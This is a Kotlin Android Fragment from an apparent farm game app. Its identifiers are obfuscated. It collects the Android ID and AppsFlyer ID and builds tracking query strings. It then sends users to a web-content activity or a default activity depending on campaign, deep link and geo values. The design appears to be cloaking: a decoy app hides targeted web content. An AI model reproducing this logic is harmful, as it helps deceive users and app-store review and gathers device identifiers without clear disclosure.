package com.foranj.farm.cvcvbu
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.owiwjiwokoksokdijxuch
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.lsodpwokkojisuhhuxcgy
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.relplpepwoksokdaoijxcji
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named
import android.content.Context
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.doxoxopcovk
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.vkkcioxokviduh
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.uhhuxc

import android.content.Intent
import android.content.SharedPreferences
import android.os.Build

import android.os.Bundle
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.nncnjvijuhf
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.hsuidiwkokoskod
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.gcvyidjfkokookdsifj
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.bhxbhchshuhdhudf
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.ujchuvhu
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.gcbbvbduijd
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.foranj.farm.R
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.qplpqplwokkosokd
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.pelpwlplwpe
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.jcjvnkdokfokkojidshufygy
import com.foranj.farm.Uqiqosiuxuhcs

import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.wpppwppspd
import com.foranj.farm.ewiowiowius.bxzy.Doooaijuhs.palpspplok


import com.foranj.farm.ewiowiowius.bxzy.Kioosiuxsaw

class Kowppwoisjdws : Fragment() {
    val jjcjkkxicvuh: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var gbbxnxjcxijvjidhu: Context


    override fun onStart() {
        super.onStart()

        val nncjcjxdkof = jjcjkkxicvuh.getString(doxoxopcovk, null)
        val oewpwpl = Intent(activity, Uqiqosiuxuhcs::class.java)

        val jjuhcijix = "com.foranj.farm"
        val oekowkookwkoqkookq = jjcjkkxicvuh.getString("mainId", null)
        val uhhusdkookx = jjcjkkxicvuh.getString("deepSt", null)

        val rokkoeokoks = Build.VERSION.RELEASE
        val jjnjncxjxcnusduhs: String? = jjcjkkxicvuh.getString(qplpqplwokkosokd, null)
        val jnjcnixjivjkodokfo = jjcjkkxicvuh.getString(vkkcioxokviduh, null)
        val sopskoxcko = jjcjkkxicvuh.getString(nncnjvijuhf, null)
        val iwiwoo = jjcjkkxicvuh.getString("appCamp", null)

        val iwowkookskodoijxuhzchu = AppsFlyerLib.getInstance().getAppsFlyerUID(gbbxnxjcxijvjidhu)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val jncxcjvnuhvduhd = jjcjkkxicvuh.getString(uhhuxc, null)
        jjcjkkxicvuh.edit().putString(owiwjiwokoksokdijxuch, iwowkookskodoijxuhzchu).apply()
        val owkokokskodjiixzhcuuzxh = Intent(activity, Kioosiuxsaw::class.java)

        val jjksioskdkokowjijisa = jjcjkkxicvuh.getString(wpppwppspd, null)

        val jcjixixc = "$sopskoxcko$palpspplok$iwiwoo&$bhxbhchshuhdhudf$iwowkookskodoijxuhzchu&$hsuidiwkokoskod$oekowkookwkoqkookq&$lsodpwokkojisuhhuxcgy$jjuhcijix&$ujchuvhu$rokkoeokoks&$relplpepwoksokdaoijxcji$gcbbvbduijd"
        val pqplqplwllpwlpskosdsok = "$sopskoxcko$bhxbhchshuhdhudf$jjksioskdkokowjijisa&$hsuidiwkokoskod$jjnjncxjxcnusduhs&$lsodpwokkojisuhhuxcgy$jjuhcijix&$ujchuvhu$rokkoeokoks&$relplpepwoksokdaoijxcji$gcbbvbduijd"
        val nnxnnnjjcjxu = "$sopskoxcko$palpspplok$uhhusdkookx&$bhxbhchshuhdhudf$iwowkookskodoijxuhzchu&$hsuidiwkokoskod$oekowkookwkoqkookq&$lsodpwokkojisuhhuxcgy$jjuhcijix&$ujchuvhu$rokkoeokoks&$relplpepwoksokdaoijxcji$gcvyidjfkokookdsifj"
        val ijwjekokos = "$sopskoxcko$palpspplok$uhhusdkookx&$bhxbhchshuhdhudf$jjksioskdkokowjijisa&$hsuidiwkokoskod$jjnjncxjxcnusduhs&$lsodpwokkojisuhhuxcgy$jjuhcijix&$ujchuvhu$rokkoeokoks&$relplpepwoksokdaoijxcji$gcvyidjfkokookdsifj"

        when(nncjcjxdkof) {
            "1" ->
                if(iwiwoo!!.contains(pelpwlplwpe)) {
                    jjcjkkxicvuh.edit().putString(jcjvnkdokfokkojidshufygy, jcjixixc).apply()
                    jjcjkkxicvuh.edit().putString("WebInt", "campaign").apply()
                    startActivity(owkokokskodjiixzhcuuzxh)
                    activity?.finish()
                } else if (uhhusdkookx!=null||jncxcjvnuhvduhd!!.contains(jnjcnixjivjkodokfo.toString())) {
                    jjcjkkxicvuh.edit().putString(jcjvnkdokfokkojidshufygy, nnxnnnjjcjxu).apply()
                    jjcjkkxicvuh.edit().putString("WebInt", "deepLink").apply()
                    startActivity(owkokokskodjiixzhcuuzxh)
                    activity?.finish()
                } else {
                    startActivity(oewpwpl)
                    activity?.finish()
                }
            "0" ->
                if(uhhusdkookx!=null) {
                    jjcjkkxicvuh.edit().putString(jcjvnkdokfokkojidshufygy, ijwjekokos).apply()
                    jjcjkkxicvuh.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(owkokokskodjiixzhcuuzxh)
                    activity?.finish()
                } else if (jncxcjvnuhvduhd!!.contains(jnjcnixjivjkodokfo.toString())) {
                    jjcjkkxicvuh.edit().putString(jcjvnkdokfokkojidshufygy, pqplqplwllpwlpskosdsok).apply()
                    jjcjkkxicvuh.edit().putString("WebInt", "geo").apply()
                    startActivity(owkokokskodjiixzhcuuzxh)
                    activity?.finish()
                } else {
                    startActivity(oewpwpl)
                    activity?.finish()
                }
        }
    }



    override fun onAttach(context: Context) {
        super.onAttach(context)
        gbbxnxjcxijvjidhu = context
    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.usisoiwjdhs, container, false)
    }

}
